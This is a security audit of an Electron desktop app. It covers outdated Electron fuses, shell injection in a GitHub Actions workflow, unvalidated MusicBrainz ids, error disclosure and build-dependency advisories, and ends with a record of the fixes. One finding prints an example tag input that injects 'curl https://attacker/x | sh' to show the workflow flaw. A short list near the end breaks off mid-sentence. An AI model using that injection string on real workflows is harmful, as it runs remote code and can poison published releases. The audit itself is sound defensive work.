# Musicalist security audit, 2026-07-29

Audited at `da1a1a1` on `main`, version 1.1.17. Baseline: `npm test` passes 243/243,
worktree clean. This is a security-only pass over the whole app: the main process and its
IPC surface, the renderer's escaping, the four API clients, the export path, the packaging
fuses, the release workflow and the dependency tree.

Severity is what it costs the user, not how hard it is to fix.

Both security findings from the 2026-07-27 audit are fixed and were re-verified: CSV formula
defusal is in place at `src/export.js:115-136` with the negative-number carve-out, and the
main process now denies window opening and blocks navigation at `src/index.js:44-49`.

**Status: all six items below were acted on in the branch that carries this file**, one commit
each, ending at version 1.2.3. Each finding keeps its original text, so this reads as the audit
as it was taken rather than as a changelog; what was done about it is in the git history and
summarised under "What was done" at the end.

## Must act

### 1. Electron 36.4.0 is out of support, and the asar integrity fuse the security policy advertises is bypassable in it

**Severity: high**
**Files: `package.json:35`, `forge.config.js:72`, `SECURITY.md:32`**

GHSA-vmqv-hx8q-j7mg is an asar integrity bypass via resource modification, affecting
`>=36.0.0-alpha.1 <36.8.1`. The pinned version is 36.4.0, squarely inside it.

That advisory is worth naming ahead of the others because of what the project claims. Two
fuses in `forge.config.js:72-73` turn on `EnableEmbeddedAsarIntegrityValidation` and
`OnlyLoadAppFromAsar`, and `SECURITY.md:32` tells a reader that the app will "require the
app to load from the asar, and validate its integrity". On 36.4.0 that validation can be
walked around, so the one packaging control the policy offers against a tampered install is
not delivering what the document says it delivers. The builds are unsigned by design, which
means this fuse is carrying more weight here than it would in a notarised app.

The wider problem is the release line. Electron supports the latest three majors; stable is
43.2.0 today, so 36.x is well past end of life. Around twenty further advisories are fixed
in 38.8.6, 39.8.1 and 39.8.5 and will never be backported, several of which touch code paths
this app is on: `nodeIntegrationInWorker` not correctly scoped in shared renderer processes,
named `window.open` targets not scoped to the opener's browsing context, and renderer
command-line switch injection through the undocumented `commandLineSwitches` webPreference.
On top of those sits every Chromium CVE since April 2025, and the renderer is a page that
builds its DOM out of community-editable MusicBrainz strings.

One trap worth recording: `npm audit --omit=dev` reports zero vulnerabilities. That is not
reassurance. Electron sits in `devDependencies`, which is the ordinary Forge layout, but the
Electron binary is the runtime of every packaged build. The production tree really is three
packages (`electron-squirrel-startup`, `debug`, `ms`), and the runtime the user launches is
not in it.

Suggested fix: move to 43.2.0. It is six majors, so budget a real pass over the app rather
than a version bump: check the `will-navigate` and `setWindowOpenHandler` behaviour still
holds, re-run the packaged-app launch check the workflow already does on macOS, and confirm
the fuses still apply cleanly. If that has to wait, 36.9.5 is the patched tail of the 36 line
and clears the asar bypass specifically, but it leaves you on a branch that receives nothing
further, so treat it as a stopgap with a date on it rather than a fix.

### 2. The workflow's tag input is interpolated into shell, on jobs holding a token that can write releases

**Severity: medium**
**File: `.github/workflows/build.yml:41-49`, `:19`**

`${{ inputs.tag }}` is expanded into the text of the `run:` script before bash ever sees it,
in two places in the "Check the tag exists" step. Both sit inside double quotes, which does
not help: an input of

```
v1"; curl https://attacker/x | sh; echo "
```

closes the quote and runs. The `echo "::error::…"` line on the failure branch is the same
shape.

What makes it worth fixing rather than noting is the token. `permissions: contents: write` is
declared at workflow level (`:19`), so every job in the file, including the three build
matrix jobs, carries a `GITHUB_TOKEN` that can create releases and overwrite their assets.
The project's entire distribution story is unsigned binaries attached to those releases, and
an unsigned binary is one nobody can verify after the fact. So the step is a path from one
input field to a poisoned download.

This needs an actor with write access to fire, since `workflow_dispatch` does. That caps it
below high: it is not remote-unauthenticated. It is the difference between one leaked
collaborator token and a compromised release, which is worth closing regardless.

Suggested fix, two parts and both small:

- Pass the input through `env:` and reference it as `"$TAG"` inside the script, so the value
  reaches bash as data rather than as source text. This is GitHub's own documented remedy.
- Drop the workflow-level permission to `contents: read` and grant `contents: write` on the
  `release` job alone. The build jobs need to read the repo and upload artifacts; nothing in
  them needs to write a release.

The second half also shrinks finding 5 below, since it takes the release-writing token out of
the jobs that run `npm ci`.

## Worth fixing

### 3. A MusicBrainz response picks a URL path with no validation

**Severity: low**
**File: `src/api/musicbrainz.js:357`, `:284`**

`pickRecording` returns `scored[0].entry.id` straight out of the response body, and `enrich`
splices it into a path unencoded:

```js
const recording = await request(`${API_BASE}/recording/${id}?fmt=json&inc=${RECORDING_INC}`, signal)
```

The inconsistency is what points at it: `recordingIdFromIsrc` at `:332` encodes its
parameter, and both AcousticBrainz calls encode theirs at `acousticbrainz.js:218` and `:230`.
This one call site does not. `coverArtUrl` at `:284` does the same with `group.id`, and that
string lands in the `coverArtArchive` column of every export.

The ceiling is low. The host is a fixed literal and nothing in a path can move it, so this
cannot be steered off musicbrainz.org. What it can do is reach a different path on that host,
or truncate the request with a `?` or `#` so the `inc=` parameter is dropped and the row comes
back empty, and it can put an arbitrary string into an exported column that reads like a URL.
It needs a compromised or malicious MusicBrainz response to matter at all, which `SECURITY.md`
puts partly out of scope, though how the app handles what they return is explicitly in scope.

Suggested fix: validate the id against a UUID pattern in `pickRecording` before returning it,
which covers both call sites at once and is the honest check, since a MusicBrainz recording id
is a UUID and nothing else. Test with a response whose `id` carries `../`, one carrying `?`,
and one that is simply not a UUID.

### 4. A bug's raw message reaches the screen and the export, which is the thing `failure.js` exists to prevent

**Severity: low**
**File: `src/api/lookup.js:186`**

`failure.js:15` keeps an allowlist of error kinds that may be shown, and the comment above it
gives the reason plainly: anything else "is a bug rather than a condition the user can do
something about, and its message could carry internals, paths or response fragments that have
no business in the UI".

`lookupSongs` does not go through that gate. Any error that is not `kind: 'network'` has its
raw `.message` copied onto the row:

```js
row = { ...blankRow(query), error: err.message }
```

From there `songCard` renders it into the card at `song-card.js:211` and `toCsv` writes it to
the `error` column. It is escaped, so this is disclosure rather than injection.

Today every thrower on that path is a curated `DeezerError`, so nothing leaks in practice.
It is latent: the first unexpected `TypeError` from a mapping change puts an internal message
on screen and into a file the user may share. The policy is written down in one module and
quietly not applied in the other, which is the kind of gap that only shows up once it has
already gone wrong.

Suggested fix: run the message through `describeFailure` here too, or apply the same
`REPORTABLE` check before assigning, so an unrecognised error becomes the generic sentence.
Test with a plain `Error('secret internal detail')` thrown from a stubbed client and assert
the row's `error` is the fallback.

## Build chain, informational

### 5. 33 advisories in the build dependencies, none with a stable fix

**Severity: informational**
**File: `package-lock.json`**

`npm audit` reports 33 (1 low, 2 moderate, 29 high, 1 critical rollup), every one of them
reached only through `@electron-forge` 7.8.1: ten criticals in `tar` 6.2.1 covering hardlink
and symlink path traversal during extraction, prototype pollution and `_.template` code
injection in `lodash`, ReDoS in `minimatch` and `picomatch`, symlink and path traversal in
`tmp`, XML injection in `@xmldom/xmldom`.

There is no upgrade that clears them. The advisory ranges run to `<=8.0.0-alpha.4`, Forge's
latest stable is 7.11.2, and npm reports `fixAvailable: false` accordingly. Bumping 7.8.1 to
7.11.2 is still worth doing for its own sake, but it will not change this number, and
`npm audit fix --force` on this tree would pull an alpha into your release toolchain, which is
a worse trade than the advisories.

These execute on whichever machine runs `npm ci` and `npm run make`, against archives Forge
downloads. That is a build integrity concern rather than a user-facing one, and the mitigation
that actually reduces it is the token scoping in finding 2: keep the machine running this
code away from a credential that can publish. Worth revisiting when Forge 8 goes stable.

### 6. Actions are pinned to major tags rather than commit SHAs

**Severity: informational**
**File: `.github/workflows/build.yml`**

`actions/checkout@v7`, `actions/setup-node@v7`, `actions/upload-artifact@v7` and
`actions/download-artifact@v8` are floating major tags, so each build runs whatever those tags
currently point at. The workflow already avoids third-party actions deliberately, which the
comment at `:150` says outright, and these four are all first-party GitHub actions, so the
exposure is small. It is still the same tag-repointing risk that pinning to a SHA removes, and
for a workflow that produces unsigned binaries people download, it is cheap insurance.

## Checked and sound

Recorded so a later audit does not re-derive them, and so a regression in any of these reads
as a regression:

- **Renderer escaping holds end to end.** Every interpolation in `song-card.js` passes through
  `text()`, `list()` or `escapeHtml` directly, including the composed `released`, `shaky`,
  `albumLine`, `soundLine`, `reachLine`, `versionLine` and `creditLine` strings, and every
  `cell()` in `summaryCells`. There is no attribute interpolation anywhere, so escaping five
  characters is sufficient for the sinks in use. The three `innerHTML` and one
  `insertAdjacentHTML` call sites in `renderer.js` all take output from those two functions.
- **The CSP is a real backstop, not decoration.** `default-src 'self'` with `connect-src 'none'`
  means a missed escape cannot reach the network, and `object-src`, `frame-src`, `base-uri` and
  `form-action` are all closed.
- **The IPC surface is four handlers and each validates what it needs to.** `open-external`
  parses rather than pattern-matches; `export-results` reduces `format` to a boolean and takes
  its path from the OS save dialog only; `run-lookup` and `cancel-lookup` carry no
  filesystem or shell reach.
- **The export error path deliberately withholds the path** and reports `err.code` only
  (`index.js:145`), which is the right call for a file the user may have put somewhere private.
- **No prototype pollution surface in the row pipeline.** Every object merged in `lookupSong`
  is built from a fixed key list, so nothing from a response body ever supplies a key name.
  `externalLinks` writes only keys drawn from the `LINK_TYPES` set.
- **Every fetch has a deadline** and combines it with the run's signal, so a stalled socket
  cannot wedge a throttle queue. This was finding 2 of the previous audit.
- **No secrets, no telemetry, no persistence.** The only credential in the repo is
  `${{ github.token }}` in the workflow, which is correct.
- **Fuses and window preferences** disable `RunAsNode`, `NODE_OPTIONS` and CLI inspect
  arguments, and pin `contextIsolation`, `nodeIntegration` and `sandbox` explicitly rather than
  inheriting them.
- **Lucene escaping** at `musicbrainz.js:292` covers the operator set and the backslash, and the
  query is quoted, so a title cannot restructure the search.
- **Deezer query construction** goes through `URLSearchParams`, and both id paths encode.

1. **Finding 2**, because it is a contained edit to one file and closes the release-integrity

2. **Finding 4**, a few lines, and it closes the gap while the policy is still only latent.

## What was done

Seven commits, 1.1.17 to 1.2.3. Recorded here because two of them did not land the way the
finding above predicted.

- **Finding 1**, Electron 36.4.0 to 43.2.0, version 1.2.0. The app was verified to start under
  43 and the suite passes. One consequence the finding did not anticipate: Electron 43 bundles
  Node 24 where 36 bundled Node 22, and the workflow pins its Node version specifically so that
  tests run on the runtime the packaged app uses. Leaving it at 22 would have quietly falsified
  that comment, so the CI pin and `.nvmrc` moved to 24 in the same commit, and the suite was
  re-run on 24 before it went in.
- **Finding 2**, both halves, one commit each. No version bump: neither is shipped code.
- **Finding 3**, `asMbid` applied at all three sites, version 1.2.2. The finding proposed
  validating in `pickRecording` alone. That turned out to cover only one of the three: the id
  `extractRecording` reports and the release group id behind `coverArtUrl` are different values
  from a different response, so the check is a shared helper rather than one guard. The fixtures
  moved off `rec-1` and onto real UUIDs, which is what they should always have been.
- **Finding 4**, version 1.2.3, but narrower than proposed. The finding suggested extending
  `REPORTABLE`; an existing test says outright that an http status is deliberately withheld from
  the user, so that set was left alone and only the missing call to `describeFailure` was added.
  A row that used to read "Deezer returned 503." now reads the generic sentence, which is what
  the project's own stated policy asks for.
- **Finding 5**, no code change, as the finding said there was none available. Forge did move
  7.8.1 to 7.11.2 (version 1.2.1) for the packaging fixes, and the advisory count went **up**,
  33 to 41, because the newer tree carries more packages. The finding predicted "it will not
  change this number", which was wrong in direction if not in substance: there is still no
  stable release that clears them, and the production tree remains three packages with none.
- **Finding 6**, four actions pinned to commits with version comments.
